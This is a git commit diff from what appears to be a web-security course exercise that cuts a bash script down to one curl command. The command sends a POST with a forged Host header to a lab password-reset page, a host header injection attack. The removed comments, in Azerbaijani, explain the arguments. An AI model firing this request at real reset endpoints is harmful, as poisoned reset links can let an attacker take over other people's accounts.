3bde06f54fc48c0ae98be7043087428e85f1fd16
resulkazimov <rsulkazimov29@gmail.com>
2026-06-28 07:23:58 +0000

    Fix: Ensure script is exactly 2 lines and READMEs updated

--- web_application_security/0x00_web_fundamentals/1-host_header_injection.sh
+++ web_application_security/0x00_web_fundamentals/1-host_header_injection.sh
@@ -1,17 +1,2 @@
 #!/bin/bash
-
-# Skriptə ötürülən arqumentləri dəyişənlərə mənimsədirik:
-# $1 = NEW HOST (Məsələn: new_host)
-# $2 = TARGET URL (Məsələn: http://web0x00.hbtn/reset_password)
-# $3 = FORM DATA (Məsələn: email=test@test.hbtn)
-
-NEW_HOST=$1
-TARGET_URL=$2
-FORM_DATA=$3
-
-# curl əmri ilə POST sorğusu göndəririk:
-# -H "Host: $NEW_HOST" -> HTTP Host başlığını hakerin hostu ilə əvəzləyir
-# -d "$FORM_DATA" -> Form məlumatlarını (məsələn emaili) POST body olaraq göndərir
-# -s -> curl-ün lazımsız yüklənmə loqlarını gizlədir (silent mode)
-
-curl -s -H "Host: $NEW_HOST" -d "$FORM_DATA" "$TARGET_URL"
+curl -s -X POST -H "Host: $1" -d "$3" "$2"
